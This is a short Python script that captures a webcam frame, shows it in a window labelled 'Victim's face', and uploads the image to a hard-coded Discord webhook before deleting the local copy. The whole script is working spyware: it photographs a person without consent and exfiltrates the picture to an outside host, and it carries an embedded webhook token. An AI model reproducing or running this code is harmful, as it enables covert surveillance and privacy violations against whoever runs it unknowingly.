import cv2
import os
import requests

def send_to_discord(screenshot):
    with open("capture.png", 'rb') as img_file:
        url = "https://discord.com/api/webhooks/1412353404042477640/7yK_e8s2dIs6-k6feDnb1nOsn9fC99y6LYD6RAad4UeZ92l__RHsl_zgC428nI6iaJ15"
        data = {"file": ('capture.png', img_file, "image/png")}
        requests.post(url, files=data)

capture = cv2.VideoCapture(0)

_, frame = capture.read()
cv2.imshow("Victim's face", frame)
cv2.imwrite("capture.png", frame)
file = "capture.png"
send_to_discord(f'capture.png')
os.remove(file)

capture.release()
cv2.destroyAllWindows()
